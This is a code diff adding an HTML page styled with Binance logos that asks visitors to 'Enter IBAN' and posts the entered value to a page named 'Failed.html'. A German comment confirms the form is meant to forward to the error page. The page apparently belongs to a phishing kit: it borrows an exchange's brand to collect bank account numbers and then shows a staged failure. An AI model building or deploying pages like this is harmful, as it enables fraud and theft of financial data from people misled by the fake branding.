@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IBAN Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #181A20;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative; /* Ermöglicht die absolute Positionierung des Logos */
+        }
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .login-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            width: 100%; /* Vollständige Breite nutzen */
+            position: relative; /* Ermöglicht das Zentrieren des Titels */
+        }
+        .top-left-logo {
+            position: absolute;
+            top: 20px; /* Abstand vom oberen Rand */
+            left: 20px; /* Abstand vom linken Rand */
+        }
+        .top-left-logo img {
+            width: 150px; /* Beispielgröße */
+            height: auto;
+        }
+        .logo {
+            width: 50px;
+            height: 50px;
+            margin-right: 10px;
+        }
+        .login-header h2 {
+            color: #333333;
+            font-size: 24px;
+            margin: 0;
+        }
+        form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .login-container label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            width: 100%;
+            text-align: left;
+        }
+        .login-container input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #cccccc;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ffd700;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-container button:hover {
+            background-color: #e6c200;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-left-logo">
+        <img src="Binance_Logo.png" alt="Binance Logo">
+    </div>
+    <div class="login-container">
+        <div class="login-header">
+            <img src="Binance.png" alt="Logo" class="logo">
+            <h2>Enter IBAN</h2>
+        </div>
+        <form action="Failed.html" method="post"> <!-- Hier zur Fehlerseite weiterleiten -->
+            <label for="iban">IBAN</label>
+            <input type="text" id="iban" name="iban" required>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+</body>
+</html>
